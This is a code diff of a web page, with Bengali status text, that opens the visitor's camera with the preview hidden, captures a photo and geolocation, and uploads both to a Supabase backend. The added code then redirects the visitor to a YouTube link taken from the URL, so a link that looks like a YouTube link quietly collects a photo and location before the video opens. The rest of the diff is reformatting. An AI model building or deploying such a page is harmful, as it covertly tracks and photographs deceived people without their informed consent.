@@ -45,7 +45,6 @@
       opacity: 0.6;
     }
 
-    /* Live camera preview hidden */
     #camera {
       display: none;
     }
@@ -85,6 +84,7 @@
 
 </div>
 
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <script>
@@ -101,6 +101,55 @@ const supabaseClient =
     SUPABASE_PUBLISHABLE_KEY
   );
 
+
+/* =========================
+   GET TARGET YOUTUBE URL
+========================= */
+
+function getTargetURL() {
+
+  const params =
+    new URLSearchParams(
+      window.location.search
+    );
+
+  const target =
+    params.get("target");
+
+  if (!target) {
+    return null;
+  }
+
+  try {
+
+    const url =
+      new URL(target);
+
+    const allowed =
+      url.protocol === "https:" &&
+      (
+        url.hostname === "youtube.com" ||
+        url.hostname === "www.youtube.com" ||
+        url.hostname === "m.youtube.com" ||
+        url.hostname === "youtu.be"
+      );
+
+    if (!allowed) {
+      return null;
+    }
+
+    return url.href;
+
+  } catch (error) {
+
+    return null;
+  }
+}
+
+
+/* =========================
+   MAIN TEST
+========================= */
 
 async function startTest() {
 
@@ -143,11 +192,8 @@ async function startTest() {
         audio: false
       });
 
-    /*
-     * Camera preview hidden থাকবে।
-     */
-
-    video.srcObject = stream;
+    video.srcObject =
+      stream;
 
     await video.play();
 
@@ -206,16 +252,19 @@ async function startTest() {
 
 
     /* =========================
-       CAMERA বন্ধ
+       STOP CAMERA
     ========================= */
 
-    stream.getTracks().forEach(track =>
-      track.stop()
-    );
+    stream
+      .getTracks()
+      .forEach(track =>
+        track.stop()
+      );
 
     stream = null;
 
-    video.srcObject = null;
+    video.srcObject =
+      null;
 
 
     /* =========================
@@ -232,22 +281,21 @@ async function startTest() {
     }
 
     const position =
-      await new Promise((resolve, reject) => {
+      await new Promise(
+        (resolve, reject) => {
 
-        navigator.geolocation.getCurrentPosition(
-          resolve,
-          reject,
-          {
-            enableHighAccuracy: false,
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            reject,
+            {
+              enableHighAccuracy: false,
+              timeout: 30000,
+              maximumAge: 30000
+            }
+          );
 
-            /* ৩০ সেকেন্ড */
-            timeout: 30000,
-
-            maximumAge: 30000
-          }
-        );
-
-      });
+        }
+      );
 
 
     const latitude =
@@ -320,7 +368,30 @@ async function startTest() {
     status.innerText =
       "✅ Photo এবং location সফলভাবে save হয়েছে।";
 
-    button.style.display = "none";
+    button.style.display =
+      "none";
+
+
+    /* =========================
+       REDIRECT TO YOUTUBE
+    ========================= */
+
+    const targetURL =
+      getTargetURL();
+
+    if (targetURL) {
+
+      status.innerText =
+        "✅ Save হয়েছে। YouTube খোলা হচ্ছে...";
+
+      setTimeout(() => {
+
+        window.location.href =
+          targetURL;
+
+      }, 800);
+
+    }
 
 
   } catch (error) {
@@ -328,12 +399,16 @@ async function startTest() {
     console.error(error);
 
     if (stream) {
-      stream.getTracks().forEach(track =>
-        track.stop()
-      );
+
+      stream
+        .getTracks()
+        .forEach(track =>
+          track.stop()
+        );
     }
 
-    button.disabled = false;
+    button.disabled =
+      false;
 
 
     if (error.code === 1) {
@@ -355,9 +430,13 @@ async function startTest() {
 
       status.innerText =
         "❌ " +
-        (error.message ||
-        "কাজটি সম্পন্ন হয়নি।");
+        (
+          error.message ||
+          "কাজটি সম্পন্ন হয়নি।"
+        );
+
     }
+
   }
 
 }
